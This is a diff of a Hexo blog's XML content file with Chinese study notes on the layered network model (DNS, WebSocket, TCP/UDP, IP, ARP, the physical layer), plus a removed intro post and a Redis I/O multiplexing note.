+DNS 协议与域名解析过程DNS 是将域名解析为 IP 地址的协议，是一切网络访问的起点。比如在浏览器中输入 www.example.com，系统会首先发起一次 DNS 查询。
+DNS 查询过程可能包括：
+
+本地 DNS 缓存查找
+向本地域名服务器发起递归查询
+逐层向根域名服务器、顶级域名服务器、权威服务器发起迭代查询
+获取到 IP 地址后，将结果缓存一段时间
+
+
+WebSocket 实现双向通信WebSocket 是建立在 HTTP 协议之上的全双工通信协议，适用于需要实时推送的应用场景，比如在线聊天、股票行情、游戏等。
+WebSocket 在建立连接阶段，会通过 HTTP 协议完成一次握手，之后升级为长连接通道，可以实现客户端与服务端之间的持续通信。
+它的优势在于：
+
+减少 HTTP 的频繁握手开销
+支持低延迟、持续推送
+客户端和服务器都可以主动发送消息
+
+常见问题包括：与轮询、长轮询的区别、心跳机制的实现方式、如何处理断线重连等。
+Websocket 轮询、长轮询轮询（Polling）
+定义：轮询是一种定时向服务器发送请求，查询数据是否有更新的方式。
+工作原理：
+客户端定时发送HTTP请求到服务器，询问是否有新的数据或事件。
+服务器处理请求并返回结果，客户端再根据返回的数据更新页面。
+
+
+特点：
+每隔一定时间（例如每秒）发送HTTP请求到服务器，即便没有新数据，服务器也会返回一个空的响应。
+消耗带宽：即使没有新数据，轮询也会带来不必要的请求和响应负载。
+延迟较高：因为请求是定期发起的，所以客户端无法获得即时更新。
+
+
+
+长轮询（Long Polling）
+定义：长轮询是轮询的改进版，客户端发送请求到服务器，直到服务器有新数据时才响应。
+工作原理：
+客户端向服务器发送一个HTTP请求，服务器如果有新数据，则立即返回响应；如果没有新数据，服务器会保持连接，直到有数据时再返回响应。
+客户端接收到响应后，再次发起新的请求，继续等待服务器的更新。
+
+
+特点：
+更低的带宽消耗：相较于轮询，长轮询只有在有新数据时才返回响应。
+相较于传统轮询，长轮询的延迟较低，因为它减少了不必要的请求。
+仍然是单向的：尽管是保持连接，客户端和服务器之间的通信仍然是单向的，服务器只能响应客户端的请求。
+
+
+
+WebSocket 心跳机制的实现方式心跳机制（Heartbeat）是为了保持 WebSocket 连接的有效性，防止连接因空闲超时被中间设备（如防火墙、代理服务器）关闭。它还可以帮助客户端检测服务器是否正常运行。
+实现方式：
+客户端发起心跳：
+客户端定期向服务器发送简单的 ping 请求，例如每隔一定的时间（如 30 秒或 1 分钟），客户端发送一个空的数据包，服务器收到后返回 pong。
+如果客户端在超时之前没有收到响应，说明连接可能已断开，客户端可以尝试重新连接。
+
+
+服务器发起心跳：
+服务器可以定期向客户端发送 ping 请求，客户端收到后返回 pong 响应。
+如果客户端在一定时间内没有返回 pong，服务器可以主动关闭连接或重新连接。
+
+
+使用 WebSocket 扩展：
+一些库或框架会实现 WebSocket 扩展，自动进行心跳机制的管理，确保连接的稳定性。
+
+
+心跳消息格式：
+通常心跳消息内容为空，例如：ping 和 pong，这并不涉及任何实际的数据传输，仅仅是连接活跃的信号。
+
+
+
+WebSocket 断线重连处理断线重连是保证 WebSocket 连接在网络异常或服务器断开连接的情况下能够自动恢复连接的机制。
+
+客户端检测连接状态：
+客户端需要监听 WebSocket 的 onclose 事件，检测到连接断开后，触发重连逻辑。
+客户端可以设置一个 重连延迟，逐步延迟重连尝试，避免因过于频繁的重连请求造成额外的负载。
+
+
+指数退避算法：
+使用指数退避算法（Exponential Backoff）来避免频繁重连。每次重连失败后，重连间隔逐步增加，直到达到最大重连次数或时间。
+
+
+自动重连逻辑：
+客户端可以在 WebSocket 断开后设置自动重连。例如，在 onclose 事件中，尝试重新建立连接，直到成功。
+有时可以结合心跳机制，定期检查连接的状态，在连接失效时触发重连。
+
+
+服务器端处理：
+服务器端可以设置连接的 超时时间，如果客户端长时间未能响应心跳或者其他操作，服务器会主动关闭连接。
+服务器应能在客户端重连时恢复之前的会话状态，避免丢失数据。
+
+
+
+
+常见的其他应用层协议除了 HTTP、HTTPS 和 DNS，还有很多常用协议在实际开发和部署中不可或缺：
+FTP（文件传输协议）
+基于 TCP
+支持用户认证、文件上传下载
+有主动模式和被动模式之分，网络环境复杂时需谨慎配置防火墙
+
+SMTP、POP3、IMAP（电子邮件协议）
+SMTP 用于发送邮件，POP3 和 IMAP 用于接收邮件
+POP3 会将邮件拉取到本地，IMAP 则支持服务器同步
+现在常见邮件服务通常使用加密版本，如 SMTPS、IMAPS
+
+
+DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）工作在应用层。
+虽然它的主要作用是为主机自动分配 IP 地址、子网掩码、网关、DNS 等网络参数，这些信息属于网络层的范畴，但协议本身是由应用层定义和执行的。
+DHCP 的运作机制简述
+DHCP 通常在局域网中使用，典型流程如下：
+
+DHCP Discover：新加入网络的主机会广播发送 DHCP Discover 报文，寻找可用的 DHCP 服务器
+DHCP Offer：DHCP 服务器响应并提供一个可用的 IP 地址等配置信息
+DHCP Request：主机从接收到的多个 Offer 中选择一个，并发出 Request 报文表示接受
+DHCP Acknowledgement：服务器确认并正式分配该地址
+
+这个过程简称为 DORA（Discover, Offer, Request, Acknowledgement） 四步交互。
+DHCP 属于应用层的原因
+
+协议的实现是在应用层完成的，使用的是客户端-服务器模型
+运行在 UDP 协议之上（即传输层用的是 UDP）
+客户端使用端口 68
+服务器使用端口 67
+
+
+报文格式和交互逻辑定义在应用层协议规范中
+
+DHCP 与其他网络层协议的关系
+虽然 DHCP 协议属于应用层，但它的作用直接影响网络层的工作：
+
+为网络层配置所需的 IP 地址、子网掩码、默认网关
+帮助主机自动获取 DNS 地址，从而支持域名解析（也是应用层功能）
+
+因此可以理解为：DHCP 是一个在应用层工作的协议，用来自动配置网络层参数。
+
+传输层传输层的作用传输层位于应用层之下，主要负责在两个主机之间提供端到端的数据传输服务。相比网络层只关心数据从哪台主机传到哪台主机，传输层更进一步，确保具体的应用程序之间可以可靠或高效地通信。
+常见的传输层协议包括 TCP 和 UDP。两者在可靠性、传输速度、连接管理等方面差异明显，适用场景也不同。
+
+TCP 协议的核心特性TCP（Transmission Control Protocol）是面向连接的协议，强调可靠传输，具备完整的错误检测、丢包重传、数据排序与流量控制机制。
+面向连接TCP 通信前必须建立连接，这一过程通过“三次握手”完成。连接建立后，双方可以双向稳定通信，通信结束后通过“四次挥手”释放连接资源。
+有序传输TCP 使用序列号（Sequence Number）对每一个字节进行编号，接收方按顺序重组数据，确保数据按发送顺序到达。
+可靠传输机制TCP 提供多种机制保障传输可靠：
+
+确认应答：接收方每收到数据会发送 ACK 确认包
+重传机制：若一定时间内未收到 ACK，发送方会重发数据
+超时重传：根据 RTT 动态计算超时时间，避免网络阻塞
+拥塞控制与流量控制：根据网络状态和接收能力调整发送速度，防止网络拥塞或接收端被压垮
+
+全双工通信TCP 支持双方同时发送和接收数据，底层通过维护两个单独的数据流来实现。
+
+TCP 三次握手与四次挥手三次握手过程
+客户端发送 SYN（同步）包，进入 SYN_SENT 状态
+服务器回复 SYN+ACK 包，进入 SYN_RCVD 状态
+客户端回复 ACK，双方进入 ESTABLISHED 状态，连接建立完成
+
+这样可以确保双方都具备发送与接收的能力，并同步初始序列号。
+四次挥手过程
+客户端发送 FIN，表示无数据可发
+服务器回复 ACK，进入 CLOSE_WAIT 状态
+服务器处理完剩余数据后，发送 FIN
+客户端回复 ACK，等待一段时间后关闭连接
+
+这种拆分可以让服务器在释放连接前处理完未发送完的数据。
+
+TCP 的流量控制与拥塞控制流量控制TCP 使用滑动窗口机制进行流量控制，窗口大小由接收方通知发送方，表示“还能接收多少数据”。发送方根据这个值控制发送速率，避免接收方缓存被压满。
+拥塞控制TCP 通过以下策略应对网络拥塞：
+
+**慢启动（Slow Start）：**每次翻倍，直到阈值后进入拥塞避免
+**拥塞避免（Congestion Avoidance）：**线性增加
+**快速重传（Fast Retransmit）：**发送方收到三个连续的对最后包的ACK，说明后续包丢失，触发快速重传
+**快速恢复（Fast Recovery）：**触发快速重传后，拥塞窗口（CWND） 会被 减少到慢启动阈值（ssthresh）的一半，并且 ssthresh 被设置为当前 CWND 的一半，然后线性增长，大概是这样，这里具体是啥忘了。。
+
+这些策略通过调整拥塞窗口大小，在检测到丢包时迅速反应，从而动态调节传输速率。
+
+UDP 协议的特点UDP（User Datagram Protocol）是无连接的协议，强调快速、轻量、无需握手。
+无连接模型UDP 不建立连接，也不维持连接状态，发送数据不需要对方回应。适用于对时延要求高、偶尔丢包可以接受的场景，如视频通话、语音传输、DNS 请求等。
+不保证顺序和可靠性UDP 数据包称为“数据报”，独立发送，不保证顺序，也不重传丢失的包。上层应用如果需要可靠性，需要自己实现逻辑。
+高效传输由于没有握手、确认等机制，UDP 的延迟更低，适合实时性强的通信场景。
+
+传输层端口的作用传输层使用端口号来区分主机上的不同进程。每个网络连接都有四元组标识：
+
+源 IP
+源端口
+目标 IP
+目标端口
+
+端口范围为 0-65535，其中 0-1023 为知名端口，常见如：
+
+HTTP：80
+HTTPS：443
+DNS：53
+FTP：21
+SSH：22
+
+端口号帮助操作系统将收到的数据准确交付到目标应用程序。
+
+TCP 粘包与拆包问题粘包和拆包 是在 TCP 协议中常见的问题，通常发生在数据发送和接收的过程中。由于 TCP 是面向流的协议（stream-oriented），它并不像 UDP 那样把每个数据包都当作独立的单位进行处理，而是将数据流通过一个持续的连接进行传输。这种特性导致了 粘包 和 拆包 问题的出现。
+什么是粘包和拆包
+粘包（Packet Concatenation）：在发送多个数据包时，由于 TCP 协议是一个 面向流的协议，多个数据包可能被合并成一个大的数据块发送，接收方接收到的数据就可能包含了多个发送的数据包。这种现象叫做“粘包”。也就是说，接收方读取的一个数据包可能包含了多个逻辑数据包，接收方需要能够正确区分这些数据包。
+拆包（Packet Fragmentation）：拆包与粘包相反，发生在发送的数据包被拆分成多个部分。由于网络传输的最大传输单元（MTU）限制，数据包可能会被分割为多个部分进行发送，接收方需要正确地将这些部分重新组合成一个完整的消息。也就是说，发送方发送的数据包可能会被拆成多个小块，接收方需要知道如何将这些碎片拼接回原始数据包。
+
+为什么会发生粘包和拆包问题TCP 是一个 面向字节流 的协议，它不会保留消息边界的概念。这意味着：
+
+在传输过程中，发送方并不会告诉接收方每次发送的数据包的边界（即数据包的开始和结束）。
+接收方收到的 TCP 数据流可能是由多个包拼接成的一个大数据块，或者一个大包被拆分成多个小数据块。
+
+这些特点导致了 粘包 和 拆包 问题的出现。
+粘包的原因：
+发送方连续快速发送数据：发送方将多个数据包快速发送，接收方无法分辨各个数据包的边界。
+TCP的流式传输：TCP 将数据作为字节流发送，没有对消息边界的明确区分，接收方必须根据协议自行处理数据的划分。
+
+拆包的原因：
+数据包大小超出网络的最大传输单元（MTU）：TCP 会根据网络的最大传输单元来分割数据，如果发送的数据包大小超过了 MTU，数据会被拆分成多个部分发送。
+数据过大或系统缓冲区限制：系统在传输过程中可能会因为缓冲区大小的限制将数据拆分为多个部分。
+
+TCP 如何处理粘包和拆包问题TCP 协议本身并不提供 消息边界 的机制，因此开发者需要在 应用层 处理粘包和拆包问题。常见的解决方法包括：
+固定长度的数据包
+概念：如果每个发送的数据包的大小是固定的，接收方就可以通过固定长度来划分数据流。例如，每次发送的数据包都是 1024 字节，那么接收方每次就可以按照 1024 字节来读取数据。
+优点：简单且容易实现，接收方只需每次读取固定长度的数据即可。
+缺点：如果数据包大小不固定，或者数据变化较大，这种方式就不能很好地处理。
+
+分隔符（协议中的特殊标识符）
+概念：通过在每个数据包的末尾加上一个特殊的分隔符（例如换行符 \n 或自定义的结束标志），接收方通过检测这些分隔符来判断数据包的边界。
+优点：简单易用，适用于小数据量的传输。
+缺点：如果数据内容本身可能包含这些分隔符，必须保证发送的数据内容不干扰分隔符的作用，或者使用更复杂的编码方式来保证分隔符的唯一性。
+
+长度字段（长度前缀）
+概念：每个数据包的开头附加一个固定长度的字段，表示该数据包的长度。接收方首先读取长度字段，然后根据长度字段来读取实际的数据内容。
+工作流程：
+发送方在每个数据包的头部加上一个 长度字段（例如 4 字节，用来表示数据包的大小）。
+接收方首先读取这个长度字段，然后根据长度字段读取相应数量的字节。
+
+
+优点：这种方式能够很好地处理变长的数据包，适用于各种情况。
+缺点：每个数据包需要额外的存储空间来保存长度字段，这增加了额外的开销。
+
+基于时间的读取
+概念：接收方根据一个固定的超时时间来确定数据包的边界。它不断地从 TCP 流中读取数据，当读取到一定数量的数据后，或者等待超时后，就将这些数据作为一个完整的消息处理。
+优点：简单且适用于数据传输速度较慢或传输间隔较长的场景。
+缺点：依赖于延时和时间的控制，可能不适用于高性能要求的场景。
+
+实际应用中的常见方法
+HTTP 协议：HTTP 使用 请求头 中的 Content-Length 或 Transfer-Encoding（如分块传输编码）来标识每个数据包的大小，从而避免了粘包和拆包问题。
+WebSocket：WebSocket 协议提供了基于消息的传输，可以避免粘包和拆包问题，因为它保证每个消息都是独立的，不会混合或拆分。
+自定义协议：在很多应用中，开发者会使用 长度字段 或 分隔符 来设计自定义协议，以解决粘包和拆包问题。例如，使用 \n 来分隔每一行数据，或者在每个数据包前加上长度字段，告诉接收方数据的大小。
+
+
+网络层网络层的作用网络层位于传输层之下，主要负责将数据从一台主机跨越多个网络传输到另一台主机。其核心任务包括：
+
+寻址：为每台主机分配唯一的地址（IP 地址）
+路由：选择一条合适的路径将数据包从源头传到目的地
+分片与重组：在链路层无法承载大数据包时进行分段传输
+
+可以将网络层类比为快递公司的“全国调度系统”，负责确定哪条路线可以最快、最稳地将快递送到目的地城市。
+
+IP 协议与地址结构IP 协议（Internet Protocol）是网络层的核心协议。每台连接到网络的设备都需要一个唯一的 IP 地址，用来标识其网络位置。
+IPv4 地址结构IPv4 使用 32 位地址，通常以点分十进制表示，例如：192.168.1.1
+IP 地址由两部分组成：
+
+网络号：标识所属的网络
+主机号：标识该网络中的主机
+
+为了支持更多网络，IP 地址又与“子网掩码”配合使用，进行网络划分。
+例如：IP 地址：192.168.1.10子网掩码：255.255.255.0则网络号为 192.168.1.0，主机号为 10
+
+子网划分与 CIDR 表示法为了更灵活地管理 IP 资源，引入了无类别域间路由（CIDR）表示法。例如：
+192.168.1.0/24
+
+其中 /24 表示前 24 位是网络号，后 8 位用于主机编号。可以容纳的主机数为：
+2^(32 - 子网掩码长度) - 2
+
+常见的子网划分技巧包括：
+
+减少广播范围，提升局域网效率
+合理分配地址空间，减少浪费
+提供更好的网络隔离和安全性
+
+
+IP 数据报结构与分片机制IP 协议是无连接、不可靠的，主要负责将数据打包为 IP 数据报并发送。
+数据报结构包括：
+
+首部：版本号、源 IP、目标 IP、TTL、协议类型等
+数据部分：封装的传输层数据（如 TCP 报文）
+
+当数据报超过底层链路的最大传输单元（MTU）时，需要进行分片：
+
+每片包含 IP 首部 + 数据片段
+设置分片偏移标志，指明每片在原始数据中的位置
+目标主机在收到所有片段后再重新组装
+
+注意：IP 分片通常由发送端或路由器完成，但过度分片可能影响性能，很多现代协议（如 TCP）会避免发送超出 MTU 的数据包。
+
+ICMP 协议与网络诊断ICMP（Internet Control Message Protocol）是网络层的重要辅助协议，主要用于网络诊断和错误反馈。
+常见用途：
+
+ping 命令：通过发送 ICMP Echo 请求检测目标主机是否可达
+traceroute 工具：用于查看数据经过的所有路由节点，通过控制 TTL 值和接收 ICMP 超时报文实现
+
+ICMP 类型众多，例如：
+
+类型 0：Echo Reply
+类型 3：目标不可达
+类型 11：TTL 超时
+
+虽然 ICMP 不用于传输实际业务数据，但在排查网络故障、判断网络连通性时极为重要。
+
+路由选择与路由协议网络层需要选择一条合适的路径将数据包从源头传送到目标地址，这就依赖于路由表和路由协议。
+静态路由与动态路由
+静态路由：由管理员手动配置，适用于结构简单、变化少的网络
+动态路由：由路由协议自动计算和维护，适用于大型复杂网络
+
+常见的路由协议
+RIP（Routing Information Protocol）：基于跳数，收敛慢，适合小网络，属于网关协议 (IGP - Interior Gateway Protocol)
+OSPF（Open Shortest Path First）：基于链路状态，收敛快、可扩展性强，属于内部网关协议
+BGP（Border Gateway Protocol）：用于自治系统间的路由，是互联网骨干的重要协议，属于外部网关协议 (EGP - Exterior Gateway Protocol)
+
+每种协议都有自己的适用范围和策略权重，实际使用时通常会根据网络规模和稳定性要求综合选择。
+
+网络地址转换（NAT）由于 IPv4 地址资源有限，大多数家庭或公司网络使用 NAT 技术让多个内网设备共享一个公网 IP。
+常见的 NAT 类型：
+
+静态 NAT：一对一映射，适合需要被外网访问的服务
+动态 NAT：从公网 IP 池中动态分配
+PAT（端口地址转换）：最常见形式，也称为 NAPT，让多个内网设备共用同一个公网 IP，通过端口区分不同连接
+
+NAT 极大地缓解了地址资源紧张问题，但也带来了一些限制，例如 P2P 通信受阻、端到端加密挑战等。
+
+数据链路层数据链路层的作用数据链路层位于网络层之下，主要职责是在同一链路内的两个节点之间可靠地传输数据帧。它不关心数据从哪台主机来，也不关心去往哪里，它只处理“从这一跳送到下一跳”。
+网络通信过程中，每经过一个路由器，数据链路层的链路就会断开并重新建立。因此，数据链路层的通信是逐段进行的，而非端到端。
+
+MAC 地址与链路标识数据链路层使用 MAC 地址（Media Access Control Address）作为主机的唯一标识。每个网卡在出厂时都会被烧录一个唯一的 48 位地址，一般用十六进制表示，例如：
+00:1A:2B:3C:4D:5E
+
+MAC 地址工作在局域网范围，不能跨越路由器。而 IP 地址是逻辑地址，可以通过网络层路由转发。
+MAC 地址在以太网通信中扮演“收件人”和“寄件人”的角色。网络设备通过 MAC 地址找到数据帧的目标主机。
+
+以太网帧的结构以太网是最常见的链路层协议，它定义了数据帧的格式和传输方式。标准以太网帧结构如下：
++----------------+----------------+-------------+---------------+-------------+|  目的 MAC 地址  |  源 MAC 地址   |  类型字段    |  数据（Payload） |  CRC 校验值   |+----------------+----------------+-------------+---------------+-------------+
+
+
+目的 MAC 地址：目标设备的地址
+源 MAC 地址：发送设备的地址
+类型字段：指出上层协议（如 0x0800 表示 IP 协议）
+数据部分：封装上层传输层或网络层的数据
+CRC 校验：用于检测数据在传输中是否被篡改
+
+每个数据帧最大传输单元（MTU）通常为 1500 字节，超出部分需要网络层进行分片。
+
+ARP 协议实现地址解析ARP（Address Resolution Protocol）是数据链路层与网络层之间的桥梁，用于将 IP 地址解析为 MAC 地址。
+典型的 ARP 流程
+主机 A 想发送数据给主机 B，只知道 B 的 IP 地址
+A 在局域网广播 ARP 请求，询问“谁是这个 IP？”
+B 收到后，发送 ARP 回复，告知自己的 MAC 地址
+A 将 B 的 MAC 地址缓存在 ARP 表中，用于后续通信
+
+这种机制是动态的，ARP 缓存会在一段时间后过期并重新解析。
+
+广播、单播与多播的区别链路层通信模式有三种：
+
+单播（Unicast）：点对点通信，只发给目标 MAC 地址
+广播（Broadcast）：发给局域网内所有设备，MAC 地址为 FF:FF:FF:FF:FF:FF
+多播（Multicast）：发给特定一组设备，MAC 地址以 01:00:5E 开头
+
+ARP 请求就是典型的广播形式，DHCP 请求、网络发现等服务也常用广播或多播机制。
+
+交换机的基本工作原理交换机是工作在数据链路层的核心设备。它通过维护一个MAC 地址表，实现高效的帧转发。
+工作流程如下：
+
+交换机收到一个数据帧，记录其源 MAC 与入口端口
+查找目的 MAC 是否已在表中
+有：直接将数据帧发到对应端口
+没有：广播给所有端口（除接收端），等待目的主机响应
+
+
+
+交换机比集线器更智能，能够避免不必要的广播，提高网络性能。
+
+集线器的基本工作原理集线器的工作原理可以理解为一个非常简单的“广播”设备。当一个设备发送数据到集线器时，集线器会将数据传递给所有其他连接到它的设备，而不是根据目标地址将数据发送给特定的设备。这意味着集线器没有智能化地判断哪些设备应该接收数据，它只是将接收到的数据广播到所有端口。
+
+VLAN 与链路层隔离机制VLAN（Virtual LAN）是一种逻辑上的网络隔离方式，可以将不同物理位置的主机划分到同一个逻辑广播域中。
+通过给以太网帧增加 VLAN Tag，可以将网络划分为多个逻辑子网，达到以下目的：
+
+控制广播范围
+提升网络安全
+简化网络管理
+
+VLAN 是一种链路层技术，但其配置依赖交换机对 802.1Q 协议的支持。
+
+数据链路层中的错误检测数据链路层不保证数据可靠，但会尽力发现错误并丢弃异常帧。其中最常见的机制是：
+
+CRC 校验：帧末尾附加校验值，用于检测传输过程中的比特错误
+帧长检查：非法帧长通常直接丢弃
+MAC 地址过滤：不符合地址匹配的帧会被忽略
+
+但需要注意的是，链路层不会自动重传数据，重传逻辑通常由传输层（如 TCP）来完成。
+
+广播风暴一些协议或服务（例如 ARP 请求、DHCP 发现请求）会产生广播数据包。如果网络中没有有效的流量控制或广播限制，可能导致广播包递归传播，形成广播风暴。
+生成树协议（STP） 是一种网络协议，用于防止交换机网络中的环路。STP 通过关闭某些冗余路径，确保在网络中没有环路，从而避免广播风暴的发生。
+
+物理层物理层的作用物理层处于网络模型的最底层，负责将比特流（0 和 1）通过各种物理媒介在设备之间传输。它不关心数据的格式、结构和含义，只关注如何把 0 和 1 表示成物理信号，并尽可能地准确传送到接收端。
+简单来说，物理层就是在解决“如何把数据发出去”，包括电缆、网卡、光纤、无线信号等。
+
+比特传输与编码方式数据在物理层以比特（bit）为单位传输。传输方式有很多种，不同场景使用的编码方式可能不同：
+
+非归零编码（NRZ）：高电平表示 1，低电平表示 0
+曼彻斯特编码：用电平跳变表示比特，抗干扰能力更强
+基带传输与宽带传输：直接调制与间接调制的区别
+
+传输的信号可以是：
+
+电信号（双绞线、同轴电缆）
+光信号（光纤）
+无线电波（Wi-Fi、蓝牙）
+
+这些信号的生成、放大、转换与传输都归属物理层。
+
+传输介质的类型物理层涉及的传输介质通常有以下几种：
+双绞线（Twisted Pair）最常用的网线类型，如 CAT5e、CAT6。其内部由成对缠绕的铜线构成，用于抵消电磁干扰。支持百兆、千兆、万兆等传输速率。
+光纤（Fiber Optic）以光信号方式传输数据，传输速率极高、距离远、抗干扰能力强。分为单模光纤和多模光纤，广泛用于数据中心与骨干网。
+同轴电缆（Coaxial Cable）早期局域网中常用的介质，现在主要用于有线电视网络。结构上有良好的屏蔽层，但已不常用于现代以太网。
+无线传输包括 Wi-Fi、蓝牙、蜂窝通信等，使用射频方式进行比特传输。属于物理层的无线信号载波，与链路层的无线协议配合使用。
+
+常见接口标准物理层的另一个重要部分是定义硬件接口标准，这些标准规定了：
+
+电压水平
+接口形状
+速率规范
+引脚定义
+
+常见接口包括：
+
+RJ45：以太网常用接口
+光纤接头（如 SC、LC）：用于光纤通信
+USB、HDMI、Serial Port：部分接口标准也涵盖物理层定义
+802.11 系列标准：Wi-Fi 的物理层和链路层协议合集
+
+
+信号传输中的干扰与失真物理层传输的信号可能受到多种干扰：
+
+串扰：相邻线路之间的电磁干扰
+噪声：来自电源、无线电、机械等外部环境的干扰
+衰减：信号随着距离的增加而变弱
+反射与回波：不良接头或阻抗不匹配导致信号反弹
+
+为了减少这些问题，通常需要配合屏蔽电缆、信号放大器、调制器等硬件设施。
+
+传输速率与带宽概念物理层中常涉及两个容易混淆的术语：
+
+带宽（Bandwidth）：表示信道理论上能承载的频率范围，单位为 Hz
+速率（Data Rate）：表示单位时间传输的比特数量，单位为 bps（bit per second）
+
+带宽越高，理论上的数据传输能力越强。但最终的传输速率还受到调制方式、信噪比、协议效率等多种因素影响。
+例如：
+
+100BASE-T：百兆以太网，最大 100 Mbps
+1000BASE-T：千兆以太网，最大 1000 Mbps
+10GBASE-SR：万兆光纤网络
+
+
+调制解调的基本概念在一些物理层实现中（尤其是模拟线路），比特信号不能直接传输，需要通过调制技术将数字信号转换为模拟信号，接收端再进行解调。
+典型例子是电话线使用的 ADSL、早期拨号上网使用的调制解调器（Modem）：
+
+调制（Modulation）：将数字信号嵌入到载波中传输
+解调（Demodulation）：从接收到的信号中还原出原始比特流
+
+虽然在现代局域网中调制已不常见，但在广域网、无线通信中仍然广泛使用。
+
+总结可以将五层模型简单地图示如下：
+应用层       ← 提供网络应用服务（如网页、邮件）传输层       ← 端到端通信，确保可靠或快速传输网络层       ← 跨网络寻址与路由，主机之间建立路径数据链路层   ← 相邻设备之间的数据帧传输（同一个链路）物理层       ← 0 和 1 的物理信号化与真实传输
+
+数据在发送时是自上而下封装的，从应用层逐层打包，到物理层转成信号发出；接收时则反过来，从物理层接收信号，逐层还原数据直到应用层。
+]]></content>
+      <tags>
+        <tag>网络</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python</title>
     <url>/2025/04/22/Python/</url>
     <content><![CDATA[引用与非引用类型Python中的引用类型与非引用类型在Python中，数据类型可以分为引用类型（可变类型）和非引用类型（不可变类型）。它们在内存中的存储方式和函数传参时的行为有明显的区别。
@@ -4131,2837 +7122,6 @@ import weakrefclass MyClass:    passobj = MyClass()weak_ref = weakref.ref(obj)pr
 ]]></content>
       <tags>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hey, there~</title>
-    <url>/2025/03/18/%E4%BB%8B%E7%BB%8D/</url>
-    <content><![CDATA[介绍Hey, there~
-使用的 hexo + butterfly 生成的静态页面,部署在 Github 个人主页
-之后应该会记录一些自己的学习笔记
-主要学习和工作方向是安全研发,但是目前工作内容很杂,因此记录的内容也会涉及不同的领域
-]]></content>
-      <tags>
-        <tag>闲话</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Redis</title>
-    <url>/2025/04/03/Redis/</url>
-    <content><![CDATA[I&#x2F;O多路复用是什么I&#x2F;O 多路复用（I&#x2F;O Multiplexing）是一种使得单个线程（或进程）能够同时监控多个 I&#x2F;O 操作的技术，它可以让程序有效地处理多个 I&#x2F;O 操作（如读取文件或网络连接）而无需为每个操作创建一个独立的线程或进程。I&#x2F;O 多路复用的核心思想是在一个线程内，能够同时处理多个 I&#x2F;O 操作，避免了频繁的线程切换和进程创建，从而提高了系统的性能和资源利用率。
-在没有 I&#x2F;O 多路复用机制的情况下，当程序需要等待多个 I&#x2F;O 操作时（比如等待多个网络连接的读取操作），通常会采取阻塞方式，直到每个操作完成。这样每个操作都会阻塞当前线程，导致系统资源浪费。I&#x2F;O 多路复用通过在一个线程内同时监听多个 I&#x2F;O 操作，使得线程在等待 I&#x2F;O 操作完成时可以继续做其他工作。
-I&#x2F;O 多路复用的工作原理I&#x2F;O 多路复用的基本原理是，程序通过一个系统调用（如 select、poll、epoll 等）将多个文件描述符注册到内核中，内核在这些文件描述符上的 I&#x2F;O 事件发生时通知程序。程序通过查询这些文件描述符的状态，确定哪些可以进行读写操作。
-具体流程如下：
-
-注册文件描述符：应用程序通过某种方式（如 select、poll、epoll 等）将需要监控的文件描述符注册到操作系统内核。
-等待 I&#x2F;O 事件：应用程序进入等待状态，等待内核通知哪些文件描述符有事件（例如数据可读、可写或异常）。
-事件发生时处理 I&#x2F;O 操作：一旦某个文件描述符有 I&#x2F;O 事件发生，内核会通知程序，程序可以读取或写入数据，或处理相应的 I&#x2F;O 操作。
-重复等待：程序处理完事件后，继续进入等待状态，直到下一个事件发生。
-
-为什么需要 I&#x2F;O 多路复用？I&#x2F;O 多路复用的目标是提高并发性和系统性能，尤其是在以下几种场景下：
-
-高并发：当需要同时处理大量 I&#x2F;O 操作（比如网络请求、文件操作等）时，创建一个线程或进程来处理每个请求可能会消耗大量系统资源，而 I&#x2F;O 多路复用通过共享一个线程来处理多个 I&#x2F;O 操作，大大减少了资源消耗。
-减少阻塞：传统的 I&#x2F;O 操作通常是阻塞的，程序会一直等待 I&#x2F;O 操作完成，直到可以读取或写入数据。而 I&#x2F;O 多路复用使得程序在等待 I&#x2F;O 操作时不会被阻塞，可以同时处理多个 I&#x2F;O 请求，提高效率。
-资源节省：通过单线程处理多个 I&#x2F;O 操作，可以避免过多的线程或进程创建，从而节省系统资源，减少上下文切换的开销。
-
-I&#x2F;O 多路复用的典型技术I&#x2F;O 多路复用的实现方式依赖于操作系统提供的系统调用，常见的实现技术包括：
-
-**select**：
-最早期的 I&#x2F;O 多路复用机制，允许程序监控多个文件描述符，判断哪些文件描述符已经准备好进行读写操作。
-select 通过传递文件描述符集合来实现，每次调用都会检查所有文件描述符的状态，因此在大量文件描述符的情况下性能会变差。
-受限于文件描述符数量（通常是 1024）。
-
-
-**poll**：
-类似于 select，但解决了 select 的一些局限，比如文件描述符数量的限制。
-poll 使用一个数组来存储文件描述符和事件，能处理任意数量的文件描述符，但性能仍然随着文件描述符数量的增加而降低。
-
-
-**epoll**：
-Linux 下提供的高效 I&#x2F;O 多路复用机制，特别适用于处理大量并发连接。
-epoll 使用事件驱动的方式，只关注那些发生事件的文件描述符，避免了不必要的检查和遍历，从而提高了性能。
-支持边缘触发（ET）和水平触发（LT）模式，能够更精确地控制 I&#x2F;O 事件。
-epoll 有两种工作模式：
-
-
-水平触发（Level Triggered，LT）：
-当某个文件描述符有数据可读时，epoll 会通知用户程序。如果程序没有读走所有数据，它会继续通知直到数据被完全读取。
-
-
-边缘触发（Edge Triggered，ET）：
-当某个文件描述符的状态从不可读变为可读时，epoll 会通知用户程序。只有当文件描述符的状态发生变化时，epoll 才会触发通知。相比于 LT 模式，ET 模式需要程序更精细地处理数据。
-
-
-
-
-**kqueue**（在 BSD 系统中）：
-类似于 epoll，是 BSD 系统（如 macOS）中的 I&#x2F;O 多路复用机制。kqueue 能高效地监控多个 I&#x2F;O 事件，支持灵活的事件处理机制。
-
-
-
-I&#x2F;O 多路复用的优缺点优点
-高并发处理：在单线程或少量线程中处理多个 I&#x2F;O 操作，避免了线程和进程切换的开销，能处理更多的并发请求。
-节省资源：减少了线程和进程的创建和销毁，避免了过多的资源消耗。
-避免阻塞：通过非阻塞的 I&#x2F;O 操作，程序能够在等待数据时继续执行其他任务，提升系统响应能力。
-
-缺点
-实现复杂：相比传统的阻塞式 I&#x2F;O，I&#x2F;O 多路复用需要处理更多的复杂性，如事件的管理和响应。
-适用场景有限：虽然 I&#x2F;O 多路复用适用于高并发场景，但它对于一些不需要处理大量并发的简单应用来说可能过于复杂。
